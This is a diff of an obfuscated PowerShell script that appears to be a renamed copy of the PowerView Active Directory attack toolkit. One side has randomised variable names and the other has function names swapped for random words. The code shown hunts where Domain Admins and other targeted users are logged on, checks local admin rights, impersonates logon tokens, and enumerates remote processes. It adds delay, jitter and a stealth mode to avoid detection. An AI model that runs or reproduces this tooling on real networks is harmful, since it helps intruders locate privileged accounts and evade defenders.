-        if ($EqAZlVKw99.Length -eq 0) {
-            throw '[drinkers] No hosts found to enumerate'
+        Write-Verbose "[rubble] TargetComputers length: $($TargetComputers.Length)"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[rubble] No hosts found to enumerate'
         }
         if ($PSBoundParameters['Credential']) {
-            $DAmvjFbJ99 = $gxazvivN99.GetNetworkCredential().UserName
+            $CurrentUser = $Credential.GetNetworkCredential().UserName
         }
         else {
-            $DAmvjFbJ99 = ([Environment]::UserName).ToLower()
+            $CurrentUser = ([Environment]::UserName).ToLower()
         }
         if ($PSBoundParameters['ShowAll']) {
-            $eKjwQtUM99 = @()
+            $TargetUsers = @()
         }
         elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
-            $eKjwQtUM99 = township @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+            $TargetUsers = prissier @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         else {
-            $YREeWdxN99 = @{
-                'Identity' = $ZgtvBxHU99
+            $GroupSearcherArguments = @{
+                'Identity' = $UserGroupIdentity
                 'Recurse' = $True
             }
-            if ($PSBoundParameters['UserDomain']) { $YREeWdxN99['Domain'] = $ojqqfkye99 }
-            if ($PSBoundParameters['UserSearchBase']) { $YREeWdxN99['SearchBase'] = $IXFyKHnF99 }
-            if ($PSBoundParameters['Server']) { $YREeWdxN99['Server'] = $mSxqoOjK99 }
-            if ($PSBoundParameters['SearchScope']) { $YREeWdxN99['SearchScope'] = $vaSWXjPs99 }
-            if ($PSBoundParameters['ResultPageSize']) { $YREeWdxN99['ResultPageSize'] = $mhcqrrQn99 }
-            if ($PSBoundParameters['ServerTimeLimit']) { $YREeWdxN99['ServerTimeLimit'] = $mvTbAWDU99 }
-            if ($PSBoundParameters['Tombstone']) { $YREeWdxN99['Tombstone'] = $rPozaKft99 }
-            if ($PSBoundParameters['Credential']) { $YREeWdxN99['Credential'] = $gxazvivN99 }
-            $eKjwQtUM99 = strippers @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
+            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
+            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
+            $TargetUsers = Aesculapius @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
-        Write-Verbose "[drinkers] TargetUsers length: $($eKjwQtUM99.Length)"
-        if ((-not $GBWfEvAA99) -and ($eKjwQtUM99.Length -eq 0)) {
-            throw '[drinkers] No users found to target'
+        Write-Verbose "[rubble] TargetUsers length: $($TargetUsers.Length)"
+        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
+            throw '[rubble] No users found to target'
         }
-        $kEgRxIzp99 = {
-            Param($VrEmrUHq99, $eKjwQtUM99, $DAmvjFbJ99, $QDuWiWQb99, $BmRRNCwx99)
-            if ($BmRRNCwx99) {
-                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
+        $HostEnumBlock = {
+            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)
+            if ($TokenHandle) {
+                $Null = locale -TokenHandle $TokenHandle -Quiet
             }
-            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
-                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
+            ForEach ($TargetComputer in $ComputerName) {
+                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    $eWqIWOTT99 = lagging -ComputerName $BumNVGRu99
-                    ForEach ($ExnuZhXQ99 in $eWqIWOTT99) {
-                        $IsWOPBva99 = $ExnuZhXQ99.UserName
-                        $CName = $ExnuZhXQ99.CName
+                    $Sessions = ploughshares -ComputerName $TargetComputer
+                    ForEach ($Session in $Sessions) {
+                        $UserName = $Session.UserName
+                        $CName = $Session.CName
                         if ($CName -and $CName.StartsWith('\\')) {
                             $CName = $CName.TrimStart('\')
                         }
-                        if (($IsWOPBva99) -and ($IsWOPBva99.Trim() -ne '') -and ($IsWOPBva99 -notmatch $DAmvjFbJ99) -and ($IsWOPBva99 -notmatch '\$$')) {
-                            if ( (-not $eKjwQtUM99) -or ($eKjwQtUM99 -contains $IsWOPBva99)) {
-                                $DrOworvY99 = New-Object PSObject
-                                $DrOworvY99 | Add-Member Noteproperty 'UserDomain' $Null
-                                $DrOworvY99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
-                                $DrOworvY99 | Add-Member Noteproperty 'ComputerName' $BumNVGRu99
-                                $DrOworvY99 | Add-Member Noteproperty 'SessionFrom' $CName
+                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {
+                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
+                                $UserLocation = New-Object PSObject
+                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
+                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
+                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
+                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName
                                 try {
-                                    $CEvCIfFk99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
-                                    $DrOworvY99 | Add-Member NoteProperty 'SessionFromName' $CEvCIfFk99
+                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
+                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                 }
                                 catch {
-                                    $DrOworvY99 | Add-Member NoteProperty 'SessionFromName' $Null
+                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                 }
-                                if ($fXeDJWKC99) {
-                                    $Admin = (Abelson -ComputerName $CName).IsAdmin
-                                    $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
+                                if ($CheckAccess) {
+                                    $Admin = (milkshake -ComputerName $CName).IsAdmin
+                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                 }
                                 else {
-                                    $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Null
+                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                 }
-                                $DrOworvY99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
-                                $DrOworvY99
+                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
+                                $UserLocation
                             }
                         }
                     }
-                    if (-not $QDuWiWQb99) {
-                        $FjaaNWoN99 = Darla -ComputerName $BumNVGRu99
-                        ForEach ($User in $FjaaNWoN99) {
-                            $IsWOPBva99 = $User.UserName
-                            $ojqqfkye99 = $User.LogonDomain
-                            if (($IsWOPBva99) -and ($IsWOPBva99.trim() -ne '')) {
-                                if ( (-not $eKjwQtUM99) -or ($eKjwQtUM99 -contains $IsWOPBva99) -and ($IsWOPBva99 -notmatch '\$$')) {
-                                    $wStfQnQJ99 = @(erupt -ComputerName $BumNVGRu99)[0].IPAddress
-                                    $DrOworvY99 = New-Object PSObject
-                                    $DrOworvY99 | Add-Member Noteproperty 'UserDomain' $ojqqfkye99
-                                    $DrOworvY99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
-                                    $DrOworvY99 | Add-Member Noteproperty 'ComputerName' $BumNVGRu99
-                                    $DrOworvY99 | Add-Member Noteproperty 'IPAddress' $wStfQnQJ99
-                                    $DrOworvY99 | Add-Member Noteproperty 'SessionFrom' $Null
-                                    $DrOworvY99 | Add-Member Noteproperty 'SessionFromName' $Null
-                                    if ($fXeDJWKC99) {
-                                        $Admin = Abelson -ComputerName $BumNVGRu99
-                                        $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
+                    if (-not $Stealth) {
+                        $LoggedOn = Tuamotu -ComputerName $TargetComputer
+                        ForEach ($User in $LoggedOn) {
+                            $UserName = $User.UserName
+                            $UserDomain = $User.LogonDomain
+                            if (($UserName) -and ($UserName.trim() -ne '')) {
+                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
+                                    $IPAddress = @(Tuscon -ComputerName $TargetComputer)[0].IPAddress
+                                    $UserLocation = New-Object PSObject
+                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
+                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
+                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
+                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
+                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
+                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null
+                                    if ($CheckAccess) {
+                                        $Admin = milkshake -ComputerName $TargetComputer
+                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                     }
                                     else {
-                                        $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Null
+                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                     }
-                                    $DrOworvY99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
-                                    $DrOworvY99
+                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
+                                    $UserLocation
                                 }
                             }
                         }
                     }
                 }
             }
-            if ($BmRRNCwx99) {
-                Nina
+            if ($TokenHandle) {
+                choke
             }
         }
-        $WUqPycDr99 = $Null
+        $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99
+                $LogonToken = locale -Credential $Credential
             }
             else {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
+                $LogonToken = locale -Credential $Credential -Quiet
             }
         }
     }
     PROCESS {
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-            Write-Verbose "[drinkers] Total number of hosts: $($EqAZlVKw99.count)"
-            Write-Verbose "[drinkers] Delay: $Delay, Jitter: $ohvTlzbv99"
-            $zLofmUyR99 = 0
-            $ZqgWUqYA99 = New-Object System.Random
-            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
-                $zLofmUyR99 = $zLofmUyR99 + 1
-                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
-                Write-Verbose "[drinkers] Enumerating server $cXOPCAwl99 ($zLofmUyR99 of $($EqAZlVKw99.Count))"
-                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $eKjwQtUM99, $DAmvjFbJ99, $QDuWiWQb99, $WUqPycDr99
-                if ($fYOedlSN99 -and $DCpfKYOf99) {
-                    Write-Verbose "[drinkers] Target user found, returning early"
+            Write-Verbose "[rubble] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[rubble] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose "[rubble] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
+                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken
+                if ($Result -and $StopOnSuccess) {
+                    Write-Verbose "[rubble] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose "[drinkers] Using threading with threads: $wCkPnMUb99"
-            Write-Verbose "[drinkers] TargetComputers length: $($EqAZlVKw99.Length)"
-            $qczwSIpm99 = @{
-                'TargetUsers' = $eKjwQtUM99
-                'CurrentUser' = $DAmvjFbJ99
-                'Stealth' = $QDuWiWQb99
-                'TokenHandle' = $WUqPycDr99
+            Write-Verbose "[rubble] Using threading with threads: $Threads"
+            Write-Verbose "[rubble] TargetComputers length: $($TargetComputers.Length)"
+            $ScriptParams = @{
+                'TargetUsers' = $TargetUsers
+                'CurrentUser' = $CurrentUser
+                'Stealth' = $Stealth
+                'TokenHandle' = $LogonToken
             }
-            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
+            wingnut -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function snowshed {
+function delivers {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
@@ -8419,184 +8419,184 @@ function snowshed {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DNSHostName')]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $cdytPdAI99,
+        $ComputerDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $glLCVedN99,
+        $ComputerLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $WrwfvIMy99,
+        $ComputerSearchBase,
         [Alias('Unconstrained')]
         [Switch]
-        $MyERHgGv99,
+        $ComputerUnconstrained,
         [ValidateNotNullOrEmpty()]
         [Alias('OperatingSystem')]
         [String]
-        $fGipudMB99,
+        $ComputerOperatingSystem,
         [ValidateNotNullOrEmpty()]
         [Alias('ServicePack')]
         [String]
-        $JKXRZnBu99,
+        $ComputerServicePack,
         [ValidateNotNullOrEmpty()]
         [Alias('SiteName')]
         [String]
-        $GtxmnElz99,
+        $ComputerSiteName,
         [Parameter(ParameterSetName = 'TargetProcess')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $lQNcEWQV99,
+        $ProcessName,
         [Parameter(ParameterSetName = 'TargetUser')]
         [Parameter(ParameterSetName = 'UserIdentity')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $rqcypngr99,
+        $UserIdentity,
         [Parameter(ParameterSetName = 'TargetUser')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $ojqqfkye99,
+        $UserDomain,
         [Parameter(ParameterSetName = 'TargetUser')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $VlBmNldu99,
+        $UserLDAPFilter,
         [Parameter(ParameterSetName = 'TargetUser')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $IXFyKHnF99,
+        $UserSearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('GroupName', 'Group')]
         [String[]]
-        $ZgtvBxHU99 = 'Domain Admins',
+        $UserGroupIdentity = 'Domain Admins',
         [Parameter(ParameterSetName = 'TargetUser')]
         [Alias('AdminCount')]
         [Switch]
-        $tUgZHPlx99,
+        $UserAdminCount,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
-        $DCpfKYOf99,
+        $StopOnSuccess,
         [ValidateRange(1, 10000)]
         [Int]
         $Delay = 0,
         [ValidateRange(0.0, 1.0)]
         [Double]
-        $ohvTlzbv99 = .3,
+        $Jitter = .3,
         [Int]
         [ValidateRange(1, 100)]
-        $wCkPnMUb99 = 20
+        $Threads = 20
     )
     BEGIN {
-        $tgaaoeGR99 = @{
+        $ComputerSearcherArguments = @{
             'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters['Domain']) { $tgaaoeGR99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
-        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
-        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
-        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
-        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
-        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
-        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
-        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
-        $xUaDkcfD99 = @{
+        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
+        $UserSearcherArguments = @{
             'Properties' = 'samaccountname'
         }
-        if ($PSBoundParameters['UserIdentity']) { $xUaDkcfD99['Identity'] = $rqcypngr99 }
-        if ($PSBoundParameters['Domain']) { $xUaDkcfD99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['UserDomain']) { $xUaDkcfD99['Domain'] = $ojqqfkye99 }
-        if ($PSBoundParameters['UserLDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $VlBmNldu99 }
-        if ($PSBoundParameters['UserSearchBase']) { $xUaDkcfD99['SearchBase'] = $IXFyKHnF99 }
-        if ($PSBoundParameters['UserAdminCount']) { $xUaDkcfD99['AdminCount'] = $tUgZHPlx99 }
-        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
+        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
+        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
+        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
+        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['ComputerName']) {
-            $EqAZlVKw99 = $VrEmrUHq99
+            $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[snowshed] Querying computers in the domain'
-            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[delivers] Querying computers in the domain'
+            $TargetComputers = sonorous @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[snowshed] TargetComputers length: $($EqAZlVKw99.Length)"
-        if ($EqAZlVKw99.Length -eq 0) {
-            throw '[snowshed] No hosts found to enumerate'
+        Write-Verbose "[delivers] TargetComputers length: $($TargetComputers.Length)"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[delivers] No hosts found to enumerate'
         }
         if ($PSBoundParameters['ProcessName']) {
-            $lxBngDbp99 = @()
-            ForEach ($T in $lQNcEWQV99) {
-                $lxBngDbp99 += $T.Split(',')
+            $TargetProcessName = @()
+            ForEach ($T in $ProcessName) {
+                $TargetProcessName += $T.Split(',')
             }
-            if ($lxBngDbp99 -isnot [System.Array]) {
-                $lxBngDbp99 = [String[]] @($lxBngDbp99)
+            if ($TargetProcessName -isnot [System.Array]) {
+                $TargetProcessName = [String[]] @($TargetProcessName)
             }
         }
         elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
-            $eKjwQtUM99 = township @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+            $TargetUsers = prissier @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         else {
-            $YREeWdxN99 = @{
-                'Identity' = $ZgtvBxHU99
+            $GroupSearcherArguments = @{
+                'Identity' = $UserGroupIdentity
                 'Recurse' = $True
             }
-            if ($PSBoundParameters['UserDomain']) { $YREeWdxN99['Domain'] = $ojqqfkye99 }
-            if ($PSBoundParameters['UserSearchBase']) { $YREeWdxN99['SearchBase'] = $IXFyKHnF99 }
-            if ($PSBoundParameters['Server']) { $YREeWdxN99['Server'] = $mSxqoOjK99 }
-            if ($PSBoundParameters['SearchScope']) { $YREeWdxN99['SearchScope'] = $vaSWXjPs99 }
-            if ($PSBoundParameters['ResultPageSize']) { $YREeWdxN99['ResultPageSize'] = $mhcqrrQn99 }
-            if ($PSBoundParameters['ServerTimeLimit']) { $YREeWdxN99['ServerTimeLimit'] = $mvTbAWDU99 }
-            if ($PSBoundParameters['Tombstone']) { $YREeWdxN99['Tombstone'] = $rPozaKft99 }
-            if ($PSBoundParameters['Credential']) { $YREeWdxN99['Credential'] = $gxazvivN99 }
-            $YREeWdxN99
-            $eKjwQtUM99 = strippers @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
+            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
+            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
+            $GroupSearcherArguments
+            $TargetUsers = Aesculapius @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
-        $kEgRxIzp99 = {
-            Param($VrEmrUHq99, $lQNcEWQV99, $eKjwQtUM99, $gxazvivN99)
-            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
-                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
+        $HostEnumBlock = {
+            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)
+            ForEach ($TargetComputer in $ComputerName) {
+                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    if ($gxazvivN99) {
-                        $KpPXKisT99 = console -Credential $gxazvivN99 -ComputerName $BumNVGRu99 -ErrorAction SilentlyContinue
+                    if ($Credential) {
+                        $Processes = frontiersman -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                     }
                     else {
-                        $KpPXKisT99 = console -ComputerName $BumNVGRu99 -ErrorAction SilentlyContinue
+                        $Processes = frontiersman -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                     }
-                    ForEach ($oRjANeVM99 in $KpPXKisT99) {
-                        if ($lQNcEWQV99) {
-                            if ($lQNcEWQV99 -Contains $oRjANeVM99.ProcessName) {
-                                $oRjANeVM99
+                    ForEach ($Process in $Processes) {
+                        if ($ProcessName) {
+                            if ($ProcessName -Contains $Process.ProcessName) {
+                                $Process
                             }
                         }
-                        elseif ($eKjwQtUM99 -Contains $oRjANeVM99.User) {
-                            $oRjANeVM99
+                        elseif ($TargetUsers -Contains $Process.User) {
+                            $Process
                         }
                     }
                 }
@@ -8605,34 +8605,34 @@ function snowshed {
     }
     PROCESS {
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-            Write-Verbose "[snowshed] Total number of hosts: $($EqAZlVKw99.count)"
-            Write-Verbose "[snowshed] Delay: $Delay, Jitter: $ohvTlzbv99"
-            $zLofmUyR99 = 0
-            $ZqgWUqYA99 = New-Object System.Random
-            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
-                $zLofmUyR99 = $zLofmUyR99 + 1
-                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
-                Write-Verbose "[snowshed] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
-                $fYOedlSN99 = Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $lxBngDbp99, $eKjwQtUM99, $gxazvivN99
-                $fYOedlSN99
-                if ($fYOedlSN99 -and $DCpfKYOf99) {
-                    Write-Verbose "[snowshed] Target user found, returning early"
+            Write-Verbose "[delivers] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[delivers] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose "[delivers] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
+                $Result
+                if ($Result -and $StopOnSuccess) {
